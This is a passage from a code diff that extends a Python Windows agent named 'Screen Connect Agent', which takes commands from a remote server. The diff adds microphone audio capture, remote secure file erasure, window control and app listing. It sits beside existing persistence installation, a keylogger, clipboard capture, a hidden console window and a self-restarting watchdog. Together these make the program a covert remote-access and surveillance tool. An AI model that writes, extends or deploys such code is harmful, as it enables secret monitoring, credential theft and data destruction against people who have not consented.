+                    "action": "window_close",
+                    **winmgr.close_window(int(data.get("hwnd", 0))),
+                })
+
+            elif tab == "window_minimize":
+                sio.emit("action_result", {
+                    "device_id": CONFIG["DEVICE_TOKEN"],
+                    "action": "window_minimize",
+                    **winmgr.minimize_window(int(data.get("hwnd", 0))),
+                })
+
+            elif tab == "window_maximize":
+                sio.emit("action_result", {
+                    "device_id": CONFIG["DEVICE_TOKEN"],
+                    "action": "window_maximize",
+                    **winmgr.maximize_window(int(data.get("hwnd", 0))),
+                })
+
+            # ── Installed Apps ─────────────────────────────────────────────
+            elif tab == "installed_apps":
+                sio.emit("action_result", {
+                    "device_id": CONFIG["DEVICE_TOKEN"],
+                    "action": "installed_apps",
+                    "apps": apps.list_apps(),
+                })
+
+            # ── Audio capture ──────────────────────────────────────────────
+            elif tab == "audio_capture":
+                sio.emit("action_result", {
+                    "device_id": CONFIG["DEVICE_TOKEN"],
+                    "action": "audio_capture",
+                    **audio.capture_chunk(
+                        seconds=float(data.get("seconds", 3.0)),
+                        sample_rate=int(data.get("sample_rate", 16000)),
+                    ),
+                })
+
+            elif tab == "audio_devices":
+                sio.emit("action_result", {
+                    "device_id": CONFIG["DEVICE_TOKEN"],
+                    "action": "audio_devices",
+                    "devices": audio.list_devices(),
+                })
+
+            # ── Secure erase ───────────────────────────────────────────────
+            elif tab == "secure_erase":
+                sio.emit("action_result", {
+                    "device_id": CONFIG["DEVICE_TOKEN"],
+                    "action": "secure_erase",
+                    **eraser.wipe_file(data.get("path", ""), int(data.get("passes", 3))),
+                })
+
+            # ── Power ──────────────────────────────────────────────────────
             elif tab == "lock_screen":
                 ctypes.windll.user32.LockWorkStation()
-                sio.emit("action_result", {"device_id": CONFIG["DEVICE_TOKEN"], "action": "lock_screen", "success": True})
+                sio.emit("action_result", {
+                    "device_id": CONFIG["DEVICE_TOKEN"],
+                    "action": "lock_screen", "success": True,
+                })
 
             elif tab == "sleep":
-                sio.emit("action_result", {"device_id": CONFIG["DEVICE_TOKEN"], "action": "sleep", "success": True})
+                sio.emit("action_result", {
+                    "device_id": CONFIG["DEVICE_TOKEN"],
+                    "action": "sleep", "success": True,
+                })
                 os.system("rundll32.exe powrprof.dll,SetSuspendState 0,1,0")
 
             elif tab == "shutdown":
-                sio.emit("action_result", {"device_id": CONFIG["DEVICE_TOKEN"], "action": "shutdown", "success": True})
-                time.sleep(1); os.system("shutdown /s /t 10 /c \"Screen Connect remote shutdown\"")
+                sio.emit("action_result", {
+                    "device_id": CONFIG["DEVICE_TOKEN"],
+                    "action": "shutdown", "success": True,
+                })
+                time.sleep(1)
+                os.system('shutdown /s /t 10 /c "Screen Connect remote shutdown"')
 
             elif tab == "restart":
-                sio.emit("action_result", {"device_id": CONFIG["DEVICE_TOKEN"], "action": "restart", "success": True})
-                time.sleep(1); os.system("shutdown /r /t 10 /c \"Screen Connect remote restart\"")
+                sio.emit("action_result", {
+                    "device_id": CONFIG["DEVICE_TOKEN"],
+                    "action": "restart", "success": True,
+                })
+                time.sleep(1)
+                os.system('shutdown /r /t 10 /c "Screen Connect remote restart"')
 
             elif tab == "abort_shutdown":
                 os.system("shutdown /a")
-                sio.emit("action_result", {"device_id": CONFIG["DEVICE_TOKEN"], "action": "abort_shutdown", "success": True})
+                sio.emit("action_result", {
+                    "device_id": CONFIG["DEVICE_TOKEN"],
+                    "action": "abort_shutdown", "success": True,
+                })
+
+            elif tab == "logoff":
+                os.system("shutdown /l")
+                sio.emit("action_result", {
+                    "device_id": CONFIG["DEVICE_TOKEN"],
+                    "action": "logoff", "success": True,
+                })
+
+            elif tab == "hibernate":
+                os.system("shutdown /h")
+                sio.emit("action_result", {
+                    "device_id": CONFIG["DEVICE_TOKEN"],
+                    "action": "hibernate", "success": True,
+                })
 
             elif tab == "uninstall":
                 remove_persistence()
@@ -1535,18 +2523,17 @@ class ScreenConnectAgent:
             else:
                 log.warning(f"Unknown tab: {tab}")
 
-    # ── Main Run Loop — creates fresh client on every reconnect ───────────
+    # ── Main Run Loop ─────────────────────────────────────────────────────
     def run(self):
         log.info(f"Screen Connect Agent v{CONFIG['AGENT_VERSION']} starting...")
         install_persistence()
+        _net_monitor.start()
         time.sleep(CONFIG["STARTUP_DELAY"])
 
         while not self._stop_flag.is_set():
-            sio = streamer = sys_monitor = heartbeat = cursor = keylogger = clipboard = None
+            sio = streamer = sys_monitor = heartbeat = cursor = keylogger = clipboard = alerts = None
             try:
-                # ── Create fresh client every attempt ─────────────────────
-                sio, streamer, sys_monitor, heartbeat, cursor, keylogger, clipboard = self._make_client()
-
+                sio, streamer, sys_monitor, heartbeat, cursor, keylogger, clipboard, alerts = self._make_client()
                 log.info(f"Connecting to {CONFIG['SERVER_URL']}...")
                 sio.connect(
                     CONFIG["SERVER_URL"],
@@ -1554,29 +2541,22 @@ class ScreenConnectAgent:
                     wait_timeout=20,
                     socketio_path="/socket.io",
                 )
-                # sio.wait() blocks until disconnect
                 sio.wait()
-
             except socketio.exceptions.ConnectionError as e:
                 log.warning(f"Connection error: {e}")
             except Exception as e:
                 log.error(f"Agent error: {e}")
             finally:
-                # Clean shutdown of all sub-components
-                try:
-                    if streamer:    streamer.stop()
-                    if sys_monitor: sys_monitor.stop()
-                    if heartbeat:   heartbeat.stop()
-                    if cursor:      cursor.stop()
-                    if keylogger:   keylogger.stop()
-                    if clipboard:   clipboard.stop()
-                except Exception:
-                    pass
+                for comp in [streamer, sys_monitor, heartbeat, cursor, keylogger, clipboard, alerts]:
+                    try:
+                        if comp and hasattr(comp, "stop"):
+                            comp.stop()
+                    except Exception:
+                        pass
 
             if self._stop_flag.is_set():
                 break
 
-            # Exponential backoff + jitter
             jitter = random.uniform(0, self._reconnect_delay * 0.3)
             delay  = self._reconnect_delay + jitter
             log.info(f"Reconnecting in {delay:.1f}s...")
@@ -1588,12 +2568,12 @@ class ScreenConnectAgent:
 
 
 # ════════════════════════════════════════════════════════════════════════════
-#  WATCHDOG — restarts agent thread if it dies unexpectedly
+#  WATCHDOG — restarts agent thread if it dies
 # ════════════════════════════════════════════════════════════════════════════
-def _watchdog(agent: ScreenConnectAgent, agent_thread_ref: list):
-    time.sleep(45)
+def _watchdog(agent_thread_ref: list):
+    time.sleep(60)
     while True:
-        time.sleep(60)
+        time.sleep(30)
         t = agent_thread_ref[0]
         if t and not t.is_alive():
             log.warning("Watchdog: agent thread died — restarting...")
@@ -1610,19 +2590,20 @@ def _watchdog(agent: ScreenConnectAgent, agent_thread_ref: list):
 #  ENTRY POINT
 # ════════════════════════════════════════════════════════════════════════════
 if __name__ == "__main__":
-    # Hide console window
+    # Hide console window on Windows
     try:
         ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
     except Exception:
         pass
 
-    agent = ScreenConnectAgent()
-
+    agent        = ScreenConnectAgent()
     agent_thread = threading.Thread(target=agent.run, daemon=False, name="sc-main")
     agent_ref    = [agent_thread]
     agent_thread.start()
 
-    watchdog_thread = threading.Thread(target=_watchdog, args=(agent, agent_ref), daemon=True, name="sc-watchdog")
+    watchdog_thread = threading.Thread(
+        target=_watchdog, args=(agent_ref,), daemon=True, name="sc-watchdog"
+    )
     watchdog_thread.start()
 
     agent_thread.join()
